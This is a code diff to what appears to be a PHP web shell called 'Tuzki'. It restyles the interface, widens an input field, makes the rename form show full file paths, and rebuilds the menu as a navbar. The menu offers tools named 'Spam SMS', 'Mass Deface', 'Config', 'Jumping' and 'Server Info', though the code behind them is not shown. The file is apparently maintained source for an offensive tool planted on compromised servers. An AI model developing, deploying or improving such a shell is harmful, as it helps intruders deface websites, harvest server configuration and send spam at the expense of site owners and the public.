@@ -139,7 +139,7 @@ body {
 	}
 	#input {
 	background: transparent;
-	width: 120px;
+	width: 250px;
 	font-family: Arial, Helvetica, monospace;
 	color:lavender;
 	}
@@ -288,7 +288,7 @@ function renames($filename) {
 	?>
 	<form method='post'>
 		<center>
-	<td>Filename : <input type='text' class='input-sm' id='input' value='<?php echo basename($filename);?>' name='newname'></td>
+	<td>Filename : <input type='text' class='input-sm' id='input' value='<?php echo $filename;?>' name='newname'></td>
 	<input type='submit' class='btn btn-danger' name='action' value='rename'>
 	</center>
 	</form>
@@ -296,21 +296,28 @@ function renames($filename) {
 	die();
 }
 // ENDFUNCTION
-
 ?>
-<center>
-	<div id='menu'>
-		<h1>Tuzki</h1>
-		<li><a href='?do=home'>[ Home ]</a></li>
-		<li><a href='?do=sms'>[ Spam SMS ]</a></li>
-		<li><a href='?do=music'>[ Music ]</a></li>
-		<li><a href='?do=jumping'>[ Jumping ]</a></li>
-		<li><a href='?do=config'>[ Config ]</a></li>
-		<li><a href='?do=mass_deface'>[ Mass Deface ]</a></li>
-		<li><a href='?do=info'>[ Server Info ]</a></li>
-		<li><a href='?do=logout'>[ Logout ]</a></li>
+ <nav class="navbar navbar-inverse">
+  <div class="container-fluid">
+	<div class="navbar-header">
+	<a class="navbar-brand" href="https://github.com/BlackHoleSecurity">Tuzki</a>
 	</div>
-</center>
+	<ul class="nav navbar-nav">
+	<li class="active"><a href="?">Home</a></li>
+	<li class="dropdown">
+		<a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools
+		<span class="caret"></span></a>
+		<ul class="dropdown-menu">
+		<li><a href='?do=sms'>Spam SMS</a></li>
+		<li><a href='?do=music'>Music</a></li>
+		<li><a href='?do=jumping'>Jumping</a></li>
+		<li><a href='?do=config'>Config</a></li>
+		<li><a href='?do=mass_deface'>Mass Deface</a></li>
+		<li><a href='?do=info'>Server Info</a></li>
+		</ul>
+		<li><a href='?do=logout'><span class="glyphicon glyphicon-log-in"></span> Logout</a></li>
+	</div>
+</nav>
 <?php
 if ($_GET['do'] == 'home') {
 	home();
